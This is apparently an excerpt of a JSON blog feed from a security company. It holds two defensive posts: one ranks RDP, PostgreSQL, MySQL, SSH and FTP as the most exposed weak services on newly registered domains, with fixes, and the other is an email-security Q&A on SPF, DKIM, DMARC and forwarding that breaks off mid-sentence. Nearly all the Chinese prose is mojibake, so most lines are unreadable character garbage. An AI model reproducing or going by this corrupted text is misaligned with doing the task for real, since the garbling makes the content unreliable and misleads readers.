æ”¶é›†ä¾†ä¸€é€±å…§æ–°è¨»å†Šç¶²åŸŸä¾†ç•¶æ¸¬è©¦å°è±¡ï¼Œå¯¦éš›ä¸Šç¸½å…±æ‰¾åˆ°äº†ç´„ 46 è¬å€‹ä¸åŒçš„ç¶²åŸŸï¼Œæ¥è‘—ç”¨ NMAP å°æ‰€æœ‰æ‰¾å‡ºä¾†çš„ç¶²åŸŸé€²è¡Œ Port Scanï¼Œæœ€å¾Œå¾çµæœä¸­æ•´ç†å‡º 5 å€‹æ–°ç¶²ç«™æœ€å¸¸è¦‹ä¸”æœ‰å¼±é»çš„æœå‹™ï¼Œæ’åæ–¹å¼ä»¥ç¶²ç«™æ•¸é‡ç‚ºæº–ã€‚</p>\n<hr>\n<h3 id=\"no.5-rdp\"><a class=\"direct-link\" href=\"#no.5-rdp\">#</a> NO.5 RDP</h3>\n<h4 id=\"1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82\"><a class=\"direct-link\" href=\"#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82\">#</a> 1. ç¶²ç«™æ•¸é‡Â : 7147(ç´„ä½”ç¸½æ•¸ 1.6%)ã€‚</h4>\n<h4 id=\"2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\"><a class=\"direct-link\" href=\"#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\">#</a> 2. æœå‹™é¡å‹Â : é ç«¯æ§åˆ¶ã€‚</h4>\n<h4 id=\"3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82\"><a class=\"direct-link\" href=\"#3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82\">#</a> 3. å°å¤– PortÂ : 3389ã€‚</h4>\n<h4 id=\"4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\">#</a> 4. å¼±é»èªªæ˜Â :</h4>\n<p>RDP(Remote Desktop Protocol) æ˜¯ Windows å…§å»ºçš„é ç«¯æ§åˆ¶åŠŸèƒ½ï¼Œç‰¹é»ä¹‹ä¸€æ˜¯æœƒæŠŠç™»å…¥éçš„ä½¿ç”¨è€…å¸³è™Ÿé¡¯ç¤ºå‡ºä¾†ï¼Œé€™å¤§å¹…é™ä½äº†é§­å®¢æš´åŠ›ç ´è§£é›£åº¦ï¼Œç”¨ Windows Server ä¾†æ¶ç«™æ¯”è¼ƒå¸¸å‡ºç¾é€™å€‹å•é¡Œã€‚</p>\n<hr>\n<h3 id=\"no.4.-postgresql-%3A\"><a class=\"direct-link\" href=\"#no.4.-postgresql-%3A\">#</a> NO.4. PostgreSQLÂ :</h3>\n<h4 id=\"1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82\"><a class=\"direct-link\" href=\"#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82\">#</a> 1. ç¶²ç«™æ•¸é‡Â : 31983 (ç´„ä½”ç¸½æ•¸ 7.0%)ã€‚</h4>\n<h4 id=\"2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\"><a class=\"direct-link\" href=\"#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\">#</a> 2. æœå‹™é¡å‹Â : è³‡æ–™åº«ã€‚</h4>\n<h4 id=\"3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82\"><a class=\"direct-link\" href=\"#3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82\">#</a> 3. å°å¤– PortÂ : 5432ã€‚</h4>\n<h4 id=\"4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\">#</a> 4. å¼±é»èªªæ˜Â :</h4>\n<p>PostgreSQL æ˜¯ä¸€å€‹å¼·å¤§çš„é–‹æºè³‡æ–™åº«ï¼Œä¸€èˆ¬ç‹€æ³ä¸‹è©²è³‡æ–™åº«é™åˆ¶åªæœ‰æœ¬åœ°æ©Ÿå™¨æ‰å¯å­˜å–ï¼Œä½†æœ‰äº›äººç‚ºäº†æ–¹ä¾¿å°‡å…¶å°å¤–é–‹æ”¾ï¼Œå°å¤–é–‹æ”¾å°±è¦ç‰¹åˆ¥æ³¨æ„æš´åŠ›ç ´è§£çš„é¢¨éšªè·Ÿç¦ç”¨é è¨­å¸³è™Ÿã€‚</p>\n<hr>\n<h3 id=\"no-3.-mysql-%3A\"><a class=\"direct-link\" href=\"#no-3.-mysql-%3A\">#</a> No 3. MySQLÂ :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82\">#</a> ç¶²ç«™æ•¸é‡Â : 38458(ç´„ä½”ç¸½æ•¸ 8.3%)ã€‚</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\">#</a> æœå‹™é¡å‹Â : è³‡æ–™åº«ã€‚</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82\">#</a> å°å¤– PortÂ : 3306ã€‚</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\">#</a> å¼±é»èªªæ˜Â :</h4>\n<p>MySQL æ˜¯è€ç‰Œä¸”æœ‰è‘—é«˜å¸‚ä½”ç‡çš„è³‡æ–™åº«ï¼Œå±éšªçš„åœ°æ–¹åœ¨æ–¼é è¨­å¸³è™Ÿ root çš„å¯†ç¢¼æ˜¯ç©ºç™½ï¼Œè³‡æ–™åº«å®‰è£æ™‚å¦‚æœæ²’æœ‰æ”¹è¨­å®šåˆå°å¤–é–‹æ”¾ï¼Œé§­å®¢æœ‰æ©Ÿæœƒé•·é©…ç›´å…¥ã€‚</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A\">#</a> ä¿®å¾©å»ºè­°Â :</h4>\n<p>è³‡æ–™åº«å®‰è£å®Œç•¢å¾Œç›¡å¿«ç§»é™¤ root å¸³è™Ÿï¼Œå¦å‰‡å°±ç®—æ²’æœ‰ä½¿ç”¨ç©ºå¯†ç¢¼ä¹Ÿæœ‰è¢«æš´åŠ›ç ´è§£çš„é¢¨éšªï¼Œå¦å¤–å»ºè­°é™åˆ¶ IP ä¾†æºï¼Œä¸‹æ–¹ç¯„ä¾‹ç‚ºæ›´æ”¹æ‰€æœ‰ç¾æœ‰çš„ç”¨æˆ¶åªèƒ½å¾æŒ‡å®š IP ç™»éŒ„ã€‚</p>\n<hr>\n<h3 id=\"no-2.-ssh-%3A\"><a class=\"direct-link\" href=\"#no-2.-ssh-%3A\">#</a> No 2. SSHÂ :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82\">#</a> ç¶²ç«™æ•¸é‡Â : 65041(ç´„ä½”ç¸½æ•¸ 14.1%)ã€‚</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\">#</a> æœå‹™é¡å‹Â : é ç«¯æ§åˆ¶ã€‚</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82\">#</a> å°å¤– PortÂ : 22ã€‚</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\">#</a> å¼±é»èªªæ˜Â :</h4>\n<p>SSH æ˜¯é ç«¯æ§åˆ¶æœ€å¸¸è¦‹çš„æ–¹æ³•ï¼Œå”è­°æœ¬èº«å®‰å…¨æ€§å¾ˆå¤ ï¼Œä½†å¸³è™Ÿå¯†ç¢¼å¼·åº¦å¤ªå¼±æ™‚é‚„æ˜¯å¾ˆå±éšªï¼Œè¶Šå¸¸è¦‹çš„åŠŸèƒ½ä¹Ÿè¶Šå¸¸è¢«é§­å®¢ç›¯ä¸Šã€‚</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2\">#</a> ä¿®å¾©å»ºè­°Â :</h4>\n<p>æ”¹ç”¨å…¬ç§é‘°ç™»å…¥ï¼Œé§­å®¢å·é‘°åŒ™é›£åº¦æ¯”çŒœå¯†ç¢¼é›£åº¦é›£ä¸Šå¤ªå¤šäº†ï¼Œå·²ç¶“æœ‰å¾ˆå¤šäººåˆ†äº«éäº†ï¼Œå°±ä¸é‡è¤‡ä»‹ç´¹ã€‚</p>\n<hr>\n<h3 id=\"no-1.-ftp-%3A\"><a class=\"direct-link\" href=\"#no-1.-ftp-%3A\">#</a> No 1. FTPÂ :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82\">#</a> ç¶²ç«™æ•¸é‡Â : 77899(ç´„ä½”ç¸½æ•¸ 16.9%)ã€‚</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82\">#</a> æœå‹™é¡å‹Â : æª”æ¡ˆå‚³è¼¸ã€‚</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82\">#</a> å°å¤– PortÂ : 21ã€‚</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3\">#</a> å¼±é»èªªæ˜Â :</h4>\n<p>FTP æ˜¯æœ€å¸¸ç”¨çš„æª”æ¡ˆå‚³è¼¸å”è­°ï¼Œä½†å®ƒæœ¬èº«çš„å®‰å…¨æ€§ä¸è¶³ï¼Œä¸ç®¡æ˜¯å‚³è¼¸æˆ–ç™»å…¥çš†ä½¿ç”¨æ˜ç¢¼å‚³è¼¸ï¼Œæœ‰å¾ˆé«˜çš„è³‡æ–™å¤–æ´©é¢¨éšªï¼Œæ›´ä¸ç”¨èªª FTP é‚„æ”¯æ´ç„¡å¸³å¯†ç™»å…¥(anyoneuser)ï¼ŒFTP å‚³æª”é›–æ–¹ä¾¿ä½†çœŸçš„ä¸é©åˆå°å¤–é–‹æ”¾ã€‚</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3\">#</a> ä¿®å¾©å»ºè­°Â :</h4>\n<p>å¦‚æœ‰å°å¤–éœ€æ±‚æ”¹ç”¨ SFTP æˆ–å…¶ä»–æœ‰æ¬Šé™æ§ç®¡çš„æª”æ¡ˆå‚³è¼¸æ–¹æ¡ˆï¼Œå¦å‰‡ç›¡å¿«é—œé–‰å°å¤–çš„ FTP æœå‹™ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>ç¾åœ¨è¶Šä¾†è¶Šå¤šäººå°‡ç¶²ç«™æ¶åœ¨é›²ä¸Šï¼Œæ¸›å°‘ç¶­é‹æˆæœ¬çš„åŒæ™‚é‚„å¯ä»¥è®“ CSP æ¥­è€…å¹«ä½ æŠŠé—œè³‡å®‰å•é¡Œï¼Œä½†ä¸ç®¡æ€éº¼æŠŠé—œä¹Ÿé˜»æ­¢ä¸äº†ä½ è‡ªå·±é–‹æ´çµ¦é§­å®¢é‘½ï¼Œç¶²ç«™æ¶åœ¨é›²ä¸Šç”¨åˆ°é ç«¯æœå‹™çš„æ©Ÿæœƒå¾ˆå¤šï¼Œå¤šèŠ±ä¸€äº›æ™‚é–“äº†è§£è©²æœå‹™ä¸¦é€²è¡Œå®‰å…¨æ€§è¨­å®šï¼Œé€™æ¨£æ‰èƒ½ä¿è­‰ï¼Œä¸ç®¡æ˜¯è³‡å®‰é‚„æ˜¯å“è³ªï¼Œæˆ‘å…¨éƒ½è¦ã€‚</p>\n<p>é€™äº›å•é¡Œåœ¨æˆç†Ÿçš„ç¶²ç«™ä¸Šæ¯”è¼ƒå°‘è¦‹ï¼Œå› ç‚ºåœ¨ç¶²ç«™ç©©å®šå¾Œå¤§å¤šæœƒé—œé–‰é€™äº›å°å¤–æœå‹™ï¼Œä½†é§­å®¢ä¹ŸçŸ¥é“é€™å€‹ç‹€æ³ï¼Œç›¯è‘—æ–°å»ºçš„ç¶²ç«™æ”»æ“Šï¼Œæƒ³è¾¦æ³•åœ¨æ¶ç«™åˆæœŸæ¤å…¥å¾Œé–€ï¼Œä¹‹å¾Œå°±ç®—ç¶²ç«™ç©©å®šå¾Œé—œé–‰å°å¤–æœå‹™ï¼Œå¾Œé–€ä¹Ÿä¸æœƒè·Ÿè‘—æ¶ˆå¤±ã€‚</p>\n<p>é€™ 5 å€‹å¸¸è¦‹å•é¡Œä¸ä»¥å¼±é»çš„åš´é‡ç¨‹åº¦ä¾†æ’åæ˜¯å› ç‚ºå…¶å®‰å…¨æ€§èˆ‡è¨­å®šå®Œå–„ç¨‹åº¦æœ‰é—œï¼Œå¯¦éš›æ¸¬è©¦çš„éç¨‹ä¸­æœ‰éƒ¨åˆ†çš„ç¶²ç«™å·²ç¶“æœ‰åšå¥½å®‰å…¨æ€§è¨­å®šï¼Œé§­å®¢å¯¦éš›ä¸Šæ˜¯æ‰“ä¸é€²å»çš„ï¼Œä½†ä¹Ÿæœ‰æ‰¾åˆ°éƒ¨åˆ†ç¶²ç«™ä½¿ç”¨é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œç”šè‡³æ˜¯é–‹æ”¾ç„¡å¸³å¯†ç™»å…¥ï¼Œé€™é¡ç¶²ç«™å—åˆ°æ”»æ“Šçš„æ©Ÿç‡éå¸¸é«˜ï¼Œå¦‚æœæ“”å¿ƒè‡ªå·±çš„ç¶²ç«™ä¹Ÿå±¬æ–¼é€™ä¸€é¡çš„è©±ï¼Œé‚„æœªä¸Šç·šçš„ç¶²ç«™å¯ç”¨å‰é¢æåˆ°çš„ NMAP æŒ‡ä»¤åœ¨å…§ç¶²é€²è¡Œæ¸¬è©¦ï¼Œå·²ä¸Šç·šçš„ç¶²ç«™å¯ä»¥åƒè€ƒå‰ä¸€ç¯‡æ–‡ç« ç”¨ Shodan æˆ– FOFA å¾å¤–ç¶²é€²å¿«é€Ÿé€²è¡Œæª¢æ¸¬ã€‚</p>\n<p>æ–‡ç« é€£çµ : <a href=\"https://medium.com/cymetrics/shodan-fofa-e7e69702923d\">é§­å®¢çš„èµ·æ‰‹å¼å·¥å…·Â : Shodan &amp; Fofa</a></p>\n",
      "date_published": "2021-07-23T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "title": "é—œæ–¼ email security çš„å¤§å°äº‹ â€” å»¶ä¼¸ç¯‡",
      "content_html": "<!-- summary -->\n<!-- éš¨è‘—å‰å¹¾ç¯‡ email security çš„ä»‹ç´¹ï¼Œæˆ‘é™¸é™¸çºŒçºŒæ”¶åˆ°äº†ä¸€äº›å•é¡Œï¼Œåœ¨äº¤æµçš„éç¨‹ä¸­è¦ºå¾—æœ‰ä¸€äº›å¾ˆé‡è¦æˆ–æ˜¯å¾ˆæœ‰è¶£çš„è¨è«–å¯ä»¥æ›´å»¶ä¼¸æ¢è¨ã€‚ä»¥ä¸‹æ¡å– Q&A çš„æ ¼å¼ï¼Œè¨˜éŒ„ä¸€äº›è¨è«–èˆ‡å»¶ä¼¸çŸ¥è­˜ã€‚ -->\n<!-- summary -->\n<p>éš¨è‘—å‰å¹¾ç¯‡ email security çš„ä»‹ç´¹ï¼Œæˆ‘é™¸é™¸çºŒçºŒæ”¶åˆ°äº†ä¸€äº›å•é¡Œï¼Œåœ¨äº¤æµçš„éç¨‹ä¸­è¦ºå¾—æœ‰ä¸€äº›å¾ˆé‡è¦æˆ–æ˜¯å¾ˆæœ‰è¶£çš„è¨è«–å¯ä»¥æ›´å»¶ä¼¸æ¢è¨ã€‚<br>\nä¸éå› ç‚ºåŸç†ç¯‡è·Ÿè¨­å®šç¯‡å¸Œæœ›å¯ä»¥èšç„¦åœ¨æ ¸å¿ƒè§€å¿µä¸Šé¿å…ä¸»é¡Œå¤ªç™¼æ•£ï¼Œæ‰€ä»¥æ±ºå®šå¦å¤–é–‹ä¸€ç¯‡ä¾†èŠèŠé€™äº›æ±è¥¿ã€‚</p>\n<p>ç¯‡å¹…ä¸Šæœƒæ¡å– Q&amp;A çš„æ ¼å¼ï¼Œè¨˜éŒ„ä¸€äº›è¨è«–èˆ‡å»¶ä¼¸çŸ¥è­˜ã€‚è‹¥è³‡è¨Šæœ‰èª¤è«‹ä¸åæŒ‡æ­£ï¼Œä¹Ÿæ­¡è¿å¤§å®¶æå•ï¼Œè®“é€™ä¸€ä¸²å•ç­”è¶Šä¾†è¶Šé½Šå…¨ XDDD</p>\n<p><a href=\"#q1\"><strong>Q1: SPF DKIM DMARC é€™äº›çœ‹èµ·ä¾†éƒ½æ˜¯ 2014 å·¦å³æ‰å‡ºç¾çš„ï¼Œæ»¿å¥½å¥‡åœ¨é€™ä¹‹å‰æ˜¯æ€éº¼é©—è­‰çš„ï¼Œé‚„æ˜¯å…¶å¯¦å®Œå…¨æ²’é©—è­‰ï¼Ÿ</strong></a></p>\n<p><a href=\"#q2\"><strong>Q2: Forwarding ä¸Šä¸€ç¯‡æåˆ°å¾ˆå¤šæ¬¡ï¼Œæ˜¯ä»€éº¼æ„æ€ï¼Ÿè·ŸæŒ‰ä¿¡ä»¶ä¸Šé¢é‚£å€‹ç®­é ­è½‰ç™¼ä¿¡ä»¶ä¸€æ¨£å—ï¼Ÿ</strong></a></p>\n<p><a href=\"#q3\"><strong>Q3: ã€ä¸­ç¹¼ email server ã€ä¹Ÿæåˆ°å¾ˆå¤šæ¬¡è€¶ï¼Œä»–æ˜¯å“ªäº›æƒ…æ³æœƒå‡ºç¾ï¼Ÿæœ‰å¯èƒ½æ˜¯ä»»æ„ domain ï¼ˆå°±æ˜¯è·Ÿæ”¶ä»¶è€…è·Ÿå¯„ä»¶è€…æœ¬èº«éƒ½æ²’ä»€éº¼é—œä¿‚ï¼‰å—ï¼Ÿ</strong></a></p>\n<p><a href=\"#q4\"><strong>Q4: <code>smtp.MailFrom</code> è·Ÿ <code>header.From</code> å¯ä»¥ä¸åŒï¼Œç„¶å¾Œ alignment åˆä¸éï¼Œé‚£ DMARC ä¸å°±å¤±æ•—å—ï¼Ÿ</strong></a></p>\n<p><a href=\"#q5\"><strong>Q5: æ‰¿ä¸Šï¼Œé‚£ä¹‹å‰æåˆ°çš„ ARC æ€éº¼è§£é€™å€‹å•é¡Œï¼Ÿ</strong></a></p>\n<p><a href=\"#q6\"><strong>Q6: å¸¸å¸¸çœ‹åˆ° SPF ç”¨ <code>~all</code> è€Œä¸æ˜¯ <code>-all</code>ï¼Œæœ‰ä»€éº¼å·®ï¼Ÿ</strong></a></p>\n<p>ä¸€æ¨£é™„ä¸Šå‰å¹¾ç¯‡çš„é€£çµï¼Œå»ºè­°çœ‹ä¸æ‡‚çš„åè©å¯ä»¥å›å»åƒç…§åŸç†ç¯‡ï¼š<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€ŠåŸç†ç¯‡</a></p>\n<p>è¨­å®šç¯‡å€‘ï¼š<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ SPF</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ DKIMã€DMARC</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šç¯„ä¾‹ç¯‡</a></p>\n<hr>\n<h2 id=\"q1\"><a class=\"direct-link\" href=\"#q1\">#</a> Q1: SPF DKIM DMARC é€™äº›çœ‹èµ·ä¾†éƒ½æ˜¯ 2014 å·¦å³æ‰å‡ºç¾çš„ï¼Œæ»¿å¥½å¥‡åœ¨é€™ä¹‹å‰æ˜¯æ€éº¼é©—è­‰çš„ï¼Œé‚„æ˜¯å…¶å¯¦å®Œå…¨æ²’é©—è­‰ï¼Ÿ</h2>\n<p>SPF èˆ‡ DKIM å…¶å¯¦æ—©åœ¨ 2000 è·Ÿ 2004 å¹´å·¦å³å°±æœ‰åœ¨è¨è«–äº†ï¼Œåªæ˜¯ä¸€ç›´æ²’æœ‰è¨‚å‡ºæ¨™æº–ã€æ›´é‘è«–æ™®åŠï¼ŒçœŸæ­£å—åˆ°é‡è¦–æ˜¯åœ¨ 2014 å¹´å·¦å³ï¼Œä¹Ÿæ˜¯å› ç‚ºé€™æ¨£æ‰å»¶ä¼¸å‡º DMARC çš„ã€‚åœ¨æ­¤ä¹‹å‰ç‚ºäº†é˜²ç¯„é‡£é­šè·Ÿåƒåœ¾ä¿¡ä»¶ï¼Œå¾€å¾€éƒ½æ˜¯ç”¨é»‘åå–®çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŠŠå·²ç¶“çŸ¥é“çš„æŸäº›æƒ¡æ„ IP æˆ–æ˜¯ mail server åˆ—åœ¨ä¸€å€‹é»‘åå–®è£¡é¢éæ¿¾æ‰ã€‚é€™è·Ÿç¾åœ¨éæ¿¾æƒ¡æ„ domain çš„æ–¹æ³•ä¸€æ¨£ï¼Œéƒ½æ˜¯äº‹å¾Œé˜²ç¯„ï¼ˆreactiveï¼‰ã€‚</p>\n<hr>\n<h2 id=\"q2\"><a class=\"direct-link\" href=\"#q2\">#</a> Q2: Forwarding ä¸Šä¸€ç¯‡æåˆ°å¾ˆå¤šæ¬¡ï¼Œæ˜¯ä»€éº¼æ„æ€ï¼Ÿè·ŸæŒ‰ä¿¡ä»¶ä¸Šé¢é‚£å€‹ç®­é ­è½‰ç™¼ä¿¡ä»¶ä¸€æ¨£å—ï¼Ÿ</h2>\n<p>æ˜¯ä¹Ÿä¸æ˜¯ã€‚</p>\n<p>Forwarding ä¸¦ä¸æ˜¯åœ¨ RFC è£¡å®šç¾©æ˜ç¢ºçš„ä¸€å€‹è©ï¼Œè€Œæ˜¯æˆ‘å€‘ç”¨ä¾†æ³›æŒ‡ã€è½‰ç™¼ã€é€™å€‹å‹•ä½œçš„ç”¨èªï¼Œè² è²¬ forwarding çš„ mail server å°±ç¨±ç‚º forwarding server æˆ–æ˜¯ <strong>mediator</strong>ï¼ˆä¸­é–“äººï¼‰ã€‚</p>\n<p>æŠ€è¡“ä¸Šæˆ‘æœƒæŠŠ forwarding ç‹¹ç¾©å®šç¾©ç‚ºï¼šåœ¨ä¿¡å°è¢‹ä¸Šï¼ˆSMTP envelopeï¼‰æ›´æ”¹æ”¶ä¿¡äººï¼ˆ<code>smtp.RcptTo</code>ï¼‰ä½†ä¿ç•™å¯„ä»¶äººï¼ˆ<code>smtp.MailFrom</code>ï¼‰çš„è¡Œç‚ºã€‚èˆ‡ forwarding ç›¸å°ï¼Œé€£ä¿¡å°è¢‹ä¸Šçš„å¯„ä»¶äººï¼ˆ<code>smtp.MailFrom</code>ï¼‰éƒ½æ”¹å¯«çš„è¡Œç‚ºï¼Œå°±ç¨±ç‚º remailingã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­ä½ æœ‰å€‹ä½åœ¨åœ‹å¤–ä¸”æº–å‚™å›åœ‹çš„æœ‹å‹ï¼Œåˆæœ‰å€‹å¾ˆæƒ³è²·ä½†ä¸å¤–é€å°ç£çš„ç²¾å“åŒ…åŒ…ï¼Œforwarding å°±åƒæ˜¯è«‹æœ‹å‹å¹«ä½ ä¸‹è¨‚ç„¶å¾Œé †ä¾¿å¸¶å›ä¾†ï¼ŒåŒ…è£¹ä¸Šå¯«çš„é‚„æ˜¯ç²¾å“å…¬å¸çš„åå­—ï¼›remailing å‰‡æ˜¯æœ‹å‹æ”¶åˆ°åŒ…åŒ…å¾Œç”¨è·¨åœ‹å¿«éå¯„å›ä¾†ï¼ŒåŒ…è£¹ä¸Šå¯«çš„æ˜¯æœ‹å‹çš„åå­—ã€‚</p>\n<p>æˆ‘å€‘ä¹‹å‰æéçš„ mailing list å°±æ˜¯ä¸€ç¨® remailingï¼Œå®ƒçš„åŸç†æ˜¯ç”±ä¸€å€‹ mail server ç¶­è­·ä¸€å€‹è² è²¬æ¥æ”¶ä¿¡çš„ reflector ä¿¡ç®±è·Ÿè¨‚é–±è€…æ¸…å–®ï¼ˆsubscribersï¼‰ï¼Œç•¶ä½ æƒ³è¦å¯„ä¸€å°ä¿¡çµ¦çœ¾è¨‚é–±è€…æ™‚ï¼Œå¯ä»¥ç”¨è‡ªå·±çš„ä¿¡ç®±æŠŠä¿¡å¯„åˆ° reflectorï¼Œé€™æ¨£å°±æœƒè§¸ç™¼ mail server æŠŠè‡ªå·±åŠ åˆ° <code>header.Reply-To</code> è·Ÿ <code>smtp.MailFrom</code> ï¼Œå†è‡ªå‹•å¹«ä½ æŠŠåŸä¿¡ä»¶è½‰ç™¼çµ¦æ‰€æœ‰è¨‚é–±è€…ã€‚æœ‰äº› marketing email æœƒé€™éº¼åšï¼Œæˆ–æ˜¯ä½ åœ¨ä¸€äº›å­¸è¡“è¨è«–ä¸²è£¡ä¹Ÿæœƒçœ‹åˆ°ï¼ˆå…¶å¯¦å°±æ˜¯ email ç‰ˆæœ¬çš„èŠå¤©å®¤ï¼‰ã€‚é€™æ¨£åšçš„å¥½è™•æ˜¯å¯ä»¥è‡ªå‹•åŒ–ç®¡ç†è¨‚é–±è€…æ¸…å–®ã€å¯„ä¿¡äººä¸ç”¨å¦å¤–ç”³è«‹æ–°çš„ä¿¡ç®±ã€è€Œä¸” mediator å¯ä»¥è¦–æƒ…æ³ä¿®æ”¹ä¿¡ä»¶å…§å®¹ï¼Œä¾‹å¦‚åœ¨ä¸»æ—¨åŠ 